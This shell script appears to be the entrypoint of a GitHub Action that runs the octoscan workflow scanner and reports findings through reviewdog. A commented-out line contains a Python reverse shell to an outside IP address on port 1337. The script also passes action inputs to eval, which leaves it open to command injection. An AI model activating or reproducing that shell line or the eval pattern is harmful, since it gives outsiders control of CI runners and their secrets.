#!/bin/sh
set -e

if [ -n "${GITHUB_WORKSPACE}" ] ; then
  cd "${GITHUB_WORKSPACE}/${INPUT_WORKDIR}" || exit
  git config --global --add safe.directory "${GITHUB_WORKSPACE}" || exit 1
fi

export REVIEWDOG_GITHUB_API_TOKEN="${INPUT_GITHUB_TOKEN}"

# Initialize the base command
OCTOSCAN_COMMAND="octoscan scan ."

# Add options if the corresponding environment variables are defined
if [ -n "$INPUT_DEBUG_RULES" ]; then
    OCTOSCAN_COMMAND="$OCTOSCAN_COMMAND --debug-rules"
fi

if [ -n "$INPUT_FILTER_TRIGGERS" ]; then
    OCTOSCAN_COMMAND="$OCTOSCAN_COMMAND --filter-triggers \"$INPUT_FILTER_TRIGGERS\""
fi

if [ -n "$INPUT_FILTER_RUN" ]; then
    OCTOSCAN_COMMAND="$OCTOSCAN_COMMAND --filter-run"
fi

if [ -n "$INPUT_IGNORE" ]; then
    OCTOSCAN_COMMAND="$OCTOSCAN_COMMAND --ignore \"$INPUT_IGNORE\""
fi

# --disable-rules and --enable-rules are exclusive
if [ -n "$INPUT_DISABLE_RULES" ] && [ -n "$INPUT_ENABLE_RULES" ]; then
    echo "Error: Both --disable-rules and --enable-rules cannot be set simultaneously."
    exit 1
fi

if [ -n "$INPUT_DISABLE_RULES" ]; then
    OCTOSCAN_COMMAND="$OCTOSCAN_COMMAND --disable-rules \"$INPUT_DISABLE_RULES\""
elif [ -n "$INPUT_ENABLE_RULES" ]; then
    OCTOSCAN_COMMAND="$OCTOSCAN_COMMAND --enable-rules \"$INPUT_ENABLE_RULES\""
fi

if [ -n "$INPUT_CONFIG_FILE" ]; then
    OCTOSCAN_COMMAND="$OCTOSCAN_COMMAND --config-file \"$INPUT_CONFIG_FILE\""
fi

REVIEWDOG_COMMAND="reviewdog -efm=\"%f:%l:%c: %m\" -name=\"octoscan\" -reporter=${INPUT_REPORTER} -filter-mode=${INPUT_FILTER_MODE} -fail-on-error=${INPUT_FAIL_ON_ERROR} -level=${INPUT_LEVEL} ${INPUT_REVIEWDOG_FLAGS}"

# Print the constructed command for debugging
echo "Octoscan command: $OCTOSCAN_COMMAND"
echo "Reviewdog command: $REVIEWDOG_COMMAND"

#python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("146.59.195.165",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

# Execute the commands
# I use eval because I don't know how to manage arguments that have space in them like for reviewdogs: reviewdogs_flags='--diff="git diff HEAD^"'
eval "$OCTOSCAN_COMMAND" | eval $REVIEWDOG_COMMAND

exit_code=$?

exit $exit_code